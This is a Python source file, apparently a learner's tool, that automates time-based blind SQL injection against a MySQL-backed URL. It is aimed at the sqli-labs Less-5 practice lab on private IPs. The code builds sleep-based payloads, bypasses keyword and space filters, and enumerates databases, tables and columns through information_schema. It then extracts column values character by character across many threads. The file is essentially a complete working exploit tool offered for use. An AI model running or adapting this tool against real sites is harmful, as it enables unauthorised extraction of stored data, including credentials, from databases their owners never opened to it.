#!/usr/bin/env python
# -*- coding: utf-8 -*-
__time__ = '2018/5/1 下午9:56'
__author__ = 'radmanxu'
__contact__ = 'radmanxu@icloud.com'
__file__ = 'timebase.py'
__software__ = 'PyCharm'

import datetime
import requests
import threading
import json

# url = 'http://192.168.9.133/sqli-labs/Less-5/?id=1'
# url = 'http://172.16.98.132/sqli-labs-master/Less-5/?id=1'
# 前构造点
before = ['\'', '\')', '\"', '\")']
# 后构造点
end = ['%23', '--+', '#', "or '1'='1"]

# 默认值
value_default = '1'
before_default = before[0]
end_default = end[0]
thread_num_default = 10
filter_default = [' ']


class TimeBase:
    def __init__(self, url, value=value_default, before=before_default, end=end_default, filter=filter_default):
        self.url = url
        self.value = value
        self.before = before
        self.thread_num = thread_num_default
        self.end = end
        self.results = {}
        self.direct_time, self.net_wave, self.time_default = (0, 0, 0)
        self.test_base_time()
        self.file_name = 'history/' + self.get_ip() + '.json'
        self.filter = filter
        # self.lock = threading.Lock()

    def get_ip(self):
        ip = ''
        if self.url[7] == '/':
            start = 8
        else:
            start = 7
        for i in range(start, len(self.url)):
            if self.url[i] == '/':
                break
            else:
                ip += self.url[i]
        return ip

    def pass_filter(self, url):
        if not self.filter:
            return url
        if ' ' in self.filter:
            return url.replace(' ', '/**/')
        if 'union' in self.filter:
            return url.replace('union', 'UNunionioN')
        if 'information_schema' in self.filter:
            return url.replace('information_schema', 'InFormatinformation_schemaion_schema')
        if 'where' in self.filter:
            return url.replace('where', 'WhwhereEre')

    def load_file(self):
        try:
            with open(self.file_name, 'r') as e:
                self.results = json.load(e)
        except FileNotFoundError:
            self.results = {}

    def dump_to_file(self):
        with open(self.file_name, 'w') as e:
            json.dump(self.results, e)

    # 测试连接时间基准
    def test_base_time(self):
        print('url：', self.url)
        print('测试网络连接中...')
        test_time_start = datetime.datetime.now()
        for i in range(5):
            requests.get(self.url)
        test_time_end = datetime.datetime.now()
        t = test_time_end.timestamp() - test_time_start.timestamp()
        self.direct_time = t / 5  # 直接连接时间
        self.net_wave = self.direct_time * self.thread_num * 1.5  # 网络波动时间
        self.time_default = (self.net_wave + self.direct_time) * 2  # 默认设置的sleep时间
        print('平均连接时间为：', self.direct_time, '秒')
        print('设置的网络波动为：', self.net_wave, '秒')
        print('设置的sleep时间为：', self.time_default, '秒')

    # 设置载荷
    def set_payload(self, what, order, compare, ascii_value, payload_type=1):
        if payload_type == 1:
            return '  and if(ascii(substr(' + what \
                   + ',' + str(order) \
                   + ',1))' + compare + str(ascii_value) \
                   + ',sleep(' + str(self.time_default) + '),1)'
        elif payload_type == 2:
            return ' and if(length(' + what + ')' + compare + str(ascii_value) + ',sleep(' + str(
                self.time_default) + '),1)'
        else:
            pass

    # 拼接url
    def set_url(self, payload):
        return self.pass_filter(self.url + self.value + self.before + payload + self.end)

    # 判断是否猜对
    def is_true(self, final_url):
        # while not self.lock.acquire():
        #     pass
        first = datetime.datetime.now()
        requests.get(final_url)
        last = datetime.datetime.now()
        # self.lock.release()
        if last.timestamp() - first.timestamp() > self.net_wave + self.direct_time:
            return True
        else:
            return False

    #
    # def is_true_lock(self, final_url):
    #     while not self.lock.acquire():
    #         pass
    #     first = datetime.datetime.now()
    #     requests.get(final_url)
    #     last = datetime.datetime.now()
    #     self.lock.release()
    #     if last.timestamp() - first.timestamp() > self.net_wave + self.direct_time:
    #         return True
    #     else:
    #         return False

    # 二分法判断
    def get_length(self, what):
        print("计算", what, '结果的长度 ...')
        min = 0
        max = 10000
        middle = 0
        while middle == 0 and max < 10e8:
            middle = (max + min) // 2
            payload = self.set_payload(what, None, '>', middle, payload_type=2)
            final_url = self.set_url(payload)
            while middle != min and middle != max and not self.is_true(
                    self.set_url(self.set_payload(what, None, '=', middle, payload_type=2))):
                if self.is_true(final_url):
                    min = middle
                else:
                    max = middle
                middle = (max + min) // 2
                payload = self.set_payload(what, None, '>', middle, payload_type=2)
                final_url = self.set_url(payload)
                # print(final_url, min, middle, max)
            if middle == 0 or self.is_true(
                    self.set_url(self.set_payload(what, None, '=', middle, payload_type=2))):
                print(what, '结果的长度为', '\033[0;32m', middle, '\033[0m')
                return middle
            elif middle != 0:
                middle = 0
                max *= 10

    # 显示进度
    def graph_percent(self, percent):
        num = int(percent * 80)
        str_output = '['
        for i in range(num):
            str_output += '='
        for i in range(80 - num - 1):
            str_output += ' '
        str_output += ']'
        print('\033[0;36m', '\r%s%s%%' % (str_output, str(percent * 100)), '\033[0m', end='')

    # 二分法获得第i个字符
    def get_results(self, what, i, result):
        min = 32
        max = 127
        middle = (max + min) // 2
        payload = self.set_payload(what, i, '>', middle)
        final_url = self.set_url(payload)
        while middle != min and middle != max and not self.is_true(
                self.set_url(self.set_payload(what, i, '=', middle))):
            if self.is_true(final_url):
                min = middle
            else:
                max = middle
            middle = (max + min) // 2
            payload = self.set_payload(what, i, '>', middle)
            final_url = self.set_url(payload)
            # print(final_url, chr(middle))
        if self.is_true(self.set_url(self.set_payload(what, i, '=', middle))):
            result[i - 1] = chr(middle)
        else:
            result[i - 1] = '??'
            # i += 1
            # print(what, '第', i, '个结果为：', result)
        return result

    # 开启多线程
    def multi_thread(self, what):
        length = self.get_length(what)
        if length == 0:
            return
        results = ['' for i in range(length)]
        t = []
        if length < self.thread_num:
            for i in range(length):
                t.append(threading.Thread(target=self.get_results, args=(what, i + 1, results)))
                t[i].start()
            for i in range(length):
                t[i].join()
                self.graph_percent((i + 1) / length)
        else:
            tasks_end = 0
            while length != tasks_end:
                tasks_start = tasks_end
                if tasks_start + self.thread_num < length:
                    tasks_end += self.thread_num
                else:
                    tasks_end = length
                for i in range(tasks_start, tasks_end):
                    t.append(threading.Thread(target=self.get_results, args=(what, i + 1, results)))
                    t[i].start()
                for i in range(tasks_start, tasks_end):
                    t[i].join()
                    self.graph_percent((i + 1) / length)
        results.append(',')
        str_result = ''
        print_result = []
        final_result = []
        # error_flag = False
        for i in results:
            if i == ',':
                final_result.append(str_result)
                print_result.append(str_result)
                str_result = ''
            elif i == '??':
                # error_flag = True
                str_result += '\033[0;31m?\033[33m'
            else:
                str_result += i
        print_result = ','.join(print_result)
        print('\n', what, '的最终结果为：\033[0;33m', print_result, '\033[0m')
        return final_result
        # if error_flag:
        #     raise TimeoutError

    def custom_attack(self):
        dump_flag = True
        self.load_file()

        #猜数据库
        result1 = []
        if self.results == {}:
            step1 = '(SELECT group_concat(schema_name) FROM information_schema.schemata)'
            # try:
            result1 = self.multi_thread(step1)
            # print(type(result1))
            # except TimeoutError:
            # dump_flag = False
            # if dump_flag:
            if '[33m' in str(result1):
                dump_flag = False
            if dump_flag:
                for i in result1:
                    self.results[i] = {}
                self.dump_to_file()
        else:
            print('\033[0;32mdatabases:\033[0m')
            for key in self.results.keys():
                print('\033[0;32m\t', key, '\033[0m')
                result1.append(key)

        # 猜表
        result2 = []
        database = input('database:')
        while database not in result1:
            print("输入错误，请重新输入")
            database = input('database:')
        if self.results[database] == {}:
            step2 = '(select group_concat(table_name) from information_schema.tables where table_schema=\'' + database + '\')'
            # try:
            result2 = self.multi_thread(step2)
            # except TimeoutError:
            #     dump_flag = False

            # if dump_flag:
            if '[33m' in str(result2):
                dump_flag = False
            if dump_flag:
                for i in result2:
                    self.results[database][i] = {}
                self.dump_to_file()
        else:
            print('\033[0;32mtables:\033[0m')
            for key in self.results[database].keys():
                print('\033[0;32m\t', key, '\033[0m')
                result2.append(key)

        # 猜列
        result3 = []
        tablename = input('tablename:')
        while tablename not in result2:
            print("输入错误，请重新输入")
            tablename = input('tablename:')
        if self.results[database][tablename] == {}:
            step3 = '(select group_concat(column_name) from information_schema.columns where table_name=\'' + tablename + '\')'
            # try:
            result3 = self.multi_thread(step3)
            # except TimeoutError:
            #     dump_flag = False
            # if dump_flag:
            if '[33m' in str(result3):
                dump_flag = False
            if dump_flag:
                for i in result3:
                    self.results[database][tablename][i] = {}
                self.dump_to_file()
        else:
            print('\033[0;32mcolumns:\033[0m')
            for key in self.results[database][tablename].keys():
                print('\033[0;32m\t', key, '\033[0m')
                result3.append(key)

        # 猜值
        what = input('what:')
        while what not in result3:
            print("输入错误，请重新输入")
            what = input('what:')
        if not self.results[database][tablename][what]:
            step4 = '(select group_concat(' + what + ') from ' + tablename + ')'
            # try:
            result4 = self.multi_thread(step4)
            # except TimeoutError:
            #     dump_flag = False
            # if dump_flag:
            if '[33m' in str(result4):
                dump_flag = False
            if dump_flag:
                self.results[database][tablename][what] = result4
                self.dump_to_file()
        else:
            print('\033[0;32mvalues:\033[0m')
            for key in self.results[database][tablename][what]:
                print('\033[0;32m\t', key, '\033[0m')

        # 单线程
        # def single_thread(url, what):
        #     length = get_length(url, what)
        #     results = ['' for i in range(length)]
        #     t = []
        #     sleep_time = 2
        #     for i in range(length):
        #         t.append(threading.Thread(target=get_results, args=(url, what, i + 1, results, sleep_time)))
        #         t[i].start()
        #         t[i].join()
        #     results.append(',')
        #     str_result = ''
        #     final_result = []
        #     for i in results:
        #         if i != ',':
        #             str_result += i
        #         else:
        #             final_result.append(str_result)
        #             str_result = ''
        #     print(what, '的最终结果为：', final_result)
        #     return final_result
        # payload = set_payload('version()', 1, '=', 15)
        # url_final = set_url(url, payload)
        # if is_true(url_final):
        #     print('yes')
        # else:
        #     print('no')


if __name__ == '__main__':
    url = 'http://172.16.98.132/sqli-labs-master/Less-5/?id='
    # url = 'http://192.168.9.133/sqli-labs/Less-5/?id=1'
    t = TimeBase(url)
    totaltime_start = datetime.datetime.now()
    print('start time: ', totaltime_start.strftime('%Y-%m-%d %I:%M:%S'))
    t.custom_attack()
    totaltime_stop = datetime.datetime.now()
    print('end time: ', totaltime_stop.strftime('%Y-%m-%d %I:%M:%S'))
    print('总耗时：', (totaltime_stop - totaltime_start).seconds, 'seconds')
